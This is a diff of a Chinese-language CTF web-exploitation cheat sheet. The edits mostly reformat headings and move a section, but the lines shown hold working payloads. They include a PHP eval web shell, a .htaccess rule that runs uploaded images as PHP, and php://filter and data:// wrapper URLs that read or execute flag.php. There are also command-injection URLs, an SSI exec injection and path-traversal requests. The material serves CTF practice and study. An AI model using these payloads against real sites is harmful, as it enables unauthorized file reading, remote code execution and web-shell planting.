@@ -251,7 +251,7 @@ SELECT * FROM users WHERE username='vampire     ';
 >
 > 如果 [] 被过滤了，可以用 {} 替代？？
 
-**test.php**
+###### test.php
 
 - 1.编辑 PHP 文件内容:
 ```php
@@ -262,12 +262,12 @@ SELECT * FROM users WHERE username='vampire     ';
 
 (如果不成功，考虑绕过，试试 test.phtml 方法)【注意，有时候后端检测了文件中的内容，有 <? 就上传不了，可以考虑下面的方法 】
 
-**test.phtml**
+###### test.phtml
 
 ```html
 <script language='php'>@eval($_POST['a']);</script>
 ```
-**.htaccess 防止绕过 php**
+###### .htaccess 防止绕过 php
 
 如果服务端禁止上传 php，可以将 php 改为图片格式 (如 png) 欺骗服务器，再使用 .htaccess 将 png 指定为 php 文件执行。(需要注意下，传图片需要确保 HTTP Headers 的 content-type 为 image/jpeg，目前知道 .htaccess 支持 Nginx 和 Apache)
 
@@ -283,7 +283,7 @@ SetHandler application/x-httpd-php
 
 ##### 伪协议
 
-**base64**
+###### base64
 
 适用于 eval()、include()
 
@@ -311,7 +311,7 @@ http://xxx/?p=php://filter/convert.base64-encode/resource=flag.php
 
 注释：使用 ?file=flag.php 读取文件可能会因为权限不足而无法读取到内容。因为有些 Web 服务器，如 Apache，会对目录或文件设置访问权限。如果当前用户没有足够的权限来读取 flag.php 文件，则无法读取到该文件的内容。而使用 ?file=php://filter/convert.base64-encode/resource=flag.php 可以绕过这些权限限制，因为 PHP 脚本本身具有读取文件的权限，它可以打开并读取任何一个它拥有的文件。通过将读取到的文件内容转换成 base64 编码后输出，即使该文件是二进制或包含特殊字符，也可以正确地输出文件内容，因此能够获取 flag。
 
-**text/plain**
+###### text/plain
 
 适用于 include()
 
@@ -332,7 +332,8 @@ http://xxx/?p=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/P
 # 当使用数据流协议 data:// 时，可以通过 base64 编码的方式来直接传递数据，而不需要引用外部文件
 ```
 
-**执行 system**
+###### 执行 system
+
 方法一
 
 ```url
@@ -358,14 +359,14 @@ http://xxx/?c=tac<fla%27%27g.php||
 
 
 
-**GET 方法注入字符串到文件流**
+###### GET 方法注入字符串到文件流
 将字符串 hello ctf 注入文件流 file
 
 ```url
 http://xxx/?file=data://text/plain,hello ctf
 ```
 
-**POST 方法注入字符串到文件流**
+###### POST 方法注入字符串到文件流
 
 适用于 file_get_contents()、include()
 
@@ -378,7 +379,24 @@ post data:<?php system("ls /"); ?>
 # 此处的 POST 只传字符串(不是键值对)
 ```
 
-**Nginx 日志文件，通过修改 User-Agent 执行 php 代码**
+##### SSI 漏洞
+
+- 1.Web 服务器已支持SSI（服务器端包含）
+- 2.Web 应用程序未对对相关SSI关键字做过滤
+- 3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）
+
+提交 POST
+
+```
+用户名 <!--#exec cmd="ls ../"-->
+密码 123123 (输入正确密码)
+```
+
+##### 直接访问服务器目录
+
+- 部分服务器会暴露本地路径，可以直接在 url 处构造路径访问
+
+###### Nginx 日志文件，通过修改 User-Agent 执行 php 代码
 
 如果 php://input 都被过滤，可以考虑此方法
 
@@ -403,17 +421,6 @@ http://xxx/?url=file:///var/www/html/flag.php
 > 查找 ../../../../ffffllllaaaagggg 文件
 ```
 http://xxx/source.php?file=hint.php?../../../../../ffffllllaaaagggg
-```
-
-##### SSI 漏洞
-- 1.Web 服务器已支持SSI（服务器端包含）
-- 2.Web 应用程序未对对相关SSI关键字做过滤
-- 3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）
-
-提交 POST
-```
-用户名 <!--#exec cmd="ls ../"-->
-密码 123123 (输入正确密码)
 ```
 
 #### 绕过复杂的正则表达式
@@ -952,5 +959,4 @@ http://xxx/testURL?url=%00file:///flag
 ##### Struts2-Scan
 
 目前测试该工具扫不了漏洞，使用说明可以自己找缓存的 README
-
 
